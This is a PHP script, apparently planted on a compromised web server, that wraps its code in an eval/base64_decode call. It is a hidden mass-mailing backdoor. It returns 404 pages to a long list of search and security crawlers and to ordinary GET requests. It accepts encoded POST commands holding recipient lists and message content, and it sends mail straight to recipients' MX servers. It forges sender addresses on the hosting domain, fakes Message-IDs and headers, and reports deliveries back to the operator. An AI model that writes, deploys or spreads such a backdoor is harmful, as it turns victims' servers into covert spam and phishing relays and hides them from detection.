<?php $s = eval(base64_decode("//set_time_limit ( 666000 );
//@ignore_user_abort (true);


function isBotDetected() {

    if ( preg_match('/abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|facebookexternalhit|facebook|facebot|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|Zeus/i', $_SERVER['HTTP_USER_AGENT'])
    ) {
        return true; // 'Above given bots detected'
    }

    return false;

} // End :: isBotDetected()

if(isBotDetected()){
header($_SERVER['SERVER_PROTOCOL']." 404 Not Found");
exit;
}



echo 'done:2';

function Mail_MessageId($domain)
{
  $gr1 = sprintf("%03d", rand() % 10);
  $gr2 = sprintf("%01X", rand() % 16);
  $gr3 = sprintf("%04X", rand() % 65536);
  $gr4 = sprintf("%04X", rand() % 65536);
  $gr5 = sprintf("%04X", rand() % 65536);
  $gr6 = sprintf("%04X", rand() % 65536);
  $gr7 = sprintf("%04X", rand() % 65536);

  $messageId = $gr1.strtolower($gr2).'01c4'.strtolower($gr3).'\$'.
    strtolower($gr4).strtolower($gr5).'\$'.strtolower($gr6).strtolower($gr7).'@'.$domain;

  $boundary  = '----=_NextPart_000_'.$gr1.(sprintf("%01X", rand() % 16)).'_01C4'.$gr7.'.'.$gr6.$gr5;

  return array($messageId, $boundary);
}


function generateMessageID()
{
  return sprintf(
    "<%s.%s@%s>",
    base_convert(mktime(), 10, 36),
    base_convert(bin2hex(openssl_random_pseudo_bytes(8)), 16, 36),
    $_SERVER['SERVER_NAME']
  );
}

function authSendEmail($from, $fromname, $to, $toname, $subject, $message, $html_MINE, $mode)
{

  /* * * * CONFIGURATION START * * * */
  $smtpServer = 'localhost';

if ($mode == 'DI'){ 
$host = substr(strstr($to, '@'), 1)."."; 
getmxrr($host, $mx_records, $mx_weight);
for($i=0;$i<count($mx_records);$i++){$mxs[$mx_records[$i]] = $mx_weight[$i];}
asort ($mxs);
$records = array_keys($mxs);
$smtpServer = $records[0];
}

if ($mode == 'PX'){ $smtpServer = 'localhost';}


  $port       = 25;
  $timeout    = 10;
  $username   = 'none';
  $password   = 'none';
  $identify   = $_SERVER['REMOTE_ADDR'];
$identify   = $_SERVER['HTTP_HOST'];


$vv = $_SERVER['HTTP_HOST'];
$vv = str_replace('www.', '', $vv);
$identify   = str_replace('WWW.', '', $vv);



  $newLine = "\r\n";
  /* * * * CONFIGURATION END * * * * */

$o_mailer = 'Ximian Evolution 2.3.1 (2.0.1-6)#The Bat! (v2.00.9) Personal#Apple Mail (2.552)#Ximian Evolution 1.0.3 (1.0.3-6)#Ximian Evolution 2.0.1 (2.0.1-6)#The Bat! (v2.00.3) Personal#Mailman v2.0.8#The Bat! (v2.00.9) Personal#Microsoft Outlook Express 6.00.2800.1158#MIME-tools 5.41 (Entity 5.404)#Microsoft Outlook Express 6.00.2800.1158#Pegasus Mail for Win32 (v3.12c)#Microsoft Outlook Express 6.00.2900.2180#Mutt 1.0.1i#Microsoft Office Outlook, Build 11.0.5510#Microsoft Outlook Express 6.00.2800.1158#Sylpheed version 0.7.6 (GTK+ 1.2.10; i686-pc-tommie-gnu)#Microsoft Outlook Express 6.00.2900.2180#Evolution/1.0-5mdk#IPB PHP Mailer#Microsoft Outlook Express 6.00.2800.1158#Microsoft Office Outlook, Build 11.0.5510#IPB PHP Mailer#acme Mail#Apple Mail#Balsa#Becky!#Bloomba#Citadel#Claris Emailer#Claws Mail#Courier#EmailTray#Eudora#Forte Agent#Foxmail#Geary#GNUMail#KMail#IBM Notes & Domino#Mail#Mailbird#Microsoft Office Outlook#Modest#Mozilla Thunderbird#Mulberry#Novell Evolution#Novell GroupWise#Opera Mail#Pegasus Mail#i.Scribe/InScribe#SeaMonkey Mail & Newsgroups#Sylpheed#Sparrow#Spicebird#The Bat!#TouchMail#Windows Live Mail#YAM#Alpine#Elm#Gnus#mailx#MH#MUSH#Mutt#Pine#sendEmail#Turnpike#Upas#24SevenOffice#Alpine#Bongo#Citadel#Horde IMP#Hula project#Kerio WebMail#Mailpile#OpenGroupware Webmail#RoundCube Webmail#SquirrelMail#WebPine#Touchmail#Zimbra';
$s_mailer = explode('#',  $o_mailer);   

$o_charsets = 'iso-8859-1#us-ascii#Windows-1252#Windows-1251#utf-8#UTF-8';
$s_charsets = explode('#',  $o_charsets);   


  $smtpConnect = @fsockopen($smtpServer, $port, $errno, $errstr, $timeout);
  
  if(empty($smtpConnect)) {
    $logArray['errno'] = $errno;
    $logArray['errstr'] = $errstr;
    $logArray['connection'] = "Failed to connect";
    $logArray['SUCCESS'] = "FALSE";
    return $logArray;
  }
  
  
  stream_set_timeout($smtpConnect, $timeout);
  
  $smtpResponse = fgets($smtpConnect, 515);
  $info = stream_get_meta_data($smtpConnect);
  if ($info['timed_out']) {
    $logArray['connection'] = "Timeout: $smtpResponse";
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  $logArray['connection'] = "Connected: $smtpResponse";
  
  

//  fputs($smtpConnect,"EHLO ".$identify . $newLine);
  fputs($smtpConnect,"EHLO ".$identify . $newLine);
  $logArray['ehlo'] = fgets($smtpConnect, 515);
  $info = stream_get_meta_data($smtpConnect);
  
  $i=0;
  while (!($info['timed_out'] || $info['unread_bytes'] == 0)) {
    $logArray['ehlo'] .= fgets($smtpConnect, 515);
    $info = stream_get_meta_data($smtpConnect);
    $i++;
  }
  if ($i=0) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  
 
  

  fputs($smtpConnect, "MAIL FROM: <".$from.">" . $newLine);
  $logArray['mailfrom'] = fgets($smtpConnect, 515);
  if (false === strpos($logArray['mailfrom'],"250")) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  
  

  fputs($smtpConnect, "RCPT TO: <".$to.">" . $newLine);
  $logArray['mailto'] = fgets($smtpConnect, 515);
  if (false === strpos($logArray['mailto'],"250")) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
//else{if ($mode == 'DI'){echo '##777##' . $to . '##888##';  }}

  

  fputs($smtpConnect, "DATA" . $newLine);
  $logArray['data1'] = fgets($smtpConnect, 515);
  if (false === strpos($logArray['data1'],"354")) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  


$mess_id = generateMessageID();
$mess_id = str_replace('WWW.', '', $mess_id);
$mess_id = str_replace('www.', '', $mess_id);

$toname ='';

$Momentn = mktime().".".md5(rand(1000,9999));
$ip = intval(rand()%255).'.'.intval(rand()%255).'.'.intval(rand()%255).'.'.intval(rand()%255);

 list($messageId, $boundary) = Mail_MessageId($identify);


//  $headers = "To: " . $to . $newLine;
  $headers = "From: ". $fromname." <".$from.">" . $newLine;
  $headers .= "Subject: ".$subject.$newLine;
  $headers .= "Reply-To: ". $fromname." <".$from.">" . $newLine;
//  $headers .= "Return-Path: ". $fromname." <".$from.">" . $newLine;
//  $headers .= "Message-ID: <".$Momentn."@".$identify.">". $newLine;
  $headers .= "Message-ID: <". $messageId  .">". $newLine;
  $headers .= 'Date: '. date("D, j M Y H:i:s O") . $newLine;
  //$headers .= 'Sender-IP: '. $ip  . $newLine;
//  $headers .= "X-Mailer: PHP/" . phpversion() . $newLine;
 // $headers .= "X-Mailer: " . $s_mailer[array_rand($s_mailer)] . $newLine;

  $headers .= "MIME-Version: 1.0" . $newLine;
  $headers .= 'Content-Transfer-Encoding: quoted-printable' . $newLine;


//  

  if ($html_MINE == 'yes') {
    $headers .= "Content-type: text/html; charset=iso-8859-1" . $newLine;
  }
  else {
    $headers .= 'Content-type: text/plain; charset="UTF-8"' . $newLine;
  }

// $headers .= "Content-Transfer-Encoding: 8bit" . $newLine . $newLine;

//  $message = wordwrap($message, 70, "\r\n");  


$header= 'Date: '. date("D, j M Y H:i:s O") . $newLine;
$header.= "From: ". $fromname." <".$from.">" . $newLine;
$header.="X-Mailer: The Bat! (v3.99.3) Professional\r\n";
$header.= "Reply-To: ". $fromname." <".$from.">" . $newLine;
$header.="X-Priority: 3 (Normal)\r\n";
$header.="Message-ID: <" .  mt_rand(111111111, 999999999)  . ".".date("YmjHis")."@$identify>\r\n";
//$header .= "Message-ID: <". $messageId  .">". $newLine;
$header.="To: <" . $to . ">\r\n";
$header .= "Subject: ".$subject.$newLine;
$header.="MIME-Version: 1.0\r\n";
$header.="Content-Type: text/plain; charset=windows-1251\r\n";
$header.="Content-Transfer-Encoding: 8bit\r\n";

$headers = $header;


$identify = substr(strstr($from, '@'), 1);

$charset = 'utf-8';
$type = 'plain';
//$to_name = 'Joseph Kied';
$to_email = $to;
$error_email = 'errors@' . $identify;
$unsub = 'http://' . $identify . '/unsubscribe';




        $a_header = "Date: ".date("D, d M Y H:i:s") . " UT\r\n";
        $a_header .= "Message-ID: <". $messageId  .">". $newLine;
        $a_header .= "Subject: =?" . $charset . "?B?" . base64_encode($subject) . "=?=\r\n";
        $a_header .= "Reply-To: " . $fromname . " <" . $from . ">\r\n";
        $a_header .= "MIME-Version: 1.0\r\n";
        $a_header .= "Content-Type: text/" . $type . "; charset=\"" . $charset . "\"\r\n";
        $a_header .= "Content-Transfer-Encoding: 8bit\r\n";
        $a_header .= "From: " . $fromname . " <" . $from . ">\r\n";
        $a_header .= "To: " . $to_name . " <" . $to_email . ">\r\n";
       // $a_header .= "Errors-To: <" . $error_email . ">\r\n";
       // $a_header .= "X-Complaints-To: " . $error_email . "\r\n";
       // $a_header .= "List-Unsubscribe: <$unsub>\r\n";
//        if(!empty($list_id)) $a_header .= "List-id: <" . $list_id . ">\r\n";
    //    $a_header .= "Precedence: bulk\r\n";


$headers = $a_header;



  $message = str_replace("\n.", "\n..",$message);
  
  
  fputs($smtpConnect, $headers.$newLine.$message.$newLine.".".$newLine);
  $logArray['data2'] = fgets($smtpConnect, 515);
  if (false === strpos($logArray['data2'],"250")) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  

  fputs($smtpConnect,"QUIT" . $newLine);
  $logArray['quit'] = fgets($smtpConnect, 515);
  
  fclose($smtpConnect);
  $logArray['SUCCESS'] = "TRUE";
  echo '##777##' . $to . '##888##';


   return $logArray;

}

function generateRandomString($length = 10) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


$method = $_SERVER['REQUEST_METHOD'];

switch ($method) {
  case 'GET':
    //Here Handle GET Request
    echo '###ERROR 404';
exit;
    break;
  case 'POST':
    //Here Handle POST Request




echo '##START_DATA##';
$i = 0;
foreach($_POST as $key => $x_value) {

$data = base64_decode($x_value) ;

$to_data = explode('|',  $data);

//$jfnbrsjfq =  mail($to_data[0], $to_data[1], $to_data[2] , $to_data[3]);
//if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} 
//exit;

$to_mails = explode('/',  $to_data[0]);

foreach($to_mails as $value){


$vv = $_SERVER['HTTP_HOST'];
$vv = str_replace('www.', '', $vv);
$from_mail_server = str_replace('WWW.', '', $vv);
$from_mail_name = substr($from_user, strpos($from_user, ' ')+1, 100);



//$from_email = strtolower ($from_mail_name) .'@' . $from_mail_server ;

$vertu = $to_data[6];
if($vertu == "333"){
}
else
{
$from_mail_server =  $vertu;
}


//$from_mail_server =  $to_data[6];

$from_user = $to_data[4];
$from_email =  substr($from_user, strpos($from_user, ' ')+1, 100) . '@' . $from_mail_server ;
$from_user = $to_data[5];



$x_body = $to_data[2];
$x_subject = $to_data[1];
$toname = 'Cris';



$SENDMAIL_TYPE = 'DI'; 
$html_MINE = 'no';


//if ($SENDMAIL_TYPE == 'DI'){
//authSendEmail($from_email, $from_user, $value, $toname, $x_subject, $x_body, $html_MINE, $SENDMAIL_TYPE);
//}

//if ($SENDMAIL_TYPE == 'DI'){
authSendEmail($from_email, $from_user, $value, $toname, $x_subject, $x_body, $html_MINE, $SENDMAIL_TYPE);
//}


$i++;
}

echo '##END_DATA##';
exit;




}
}"));
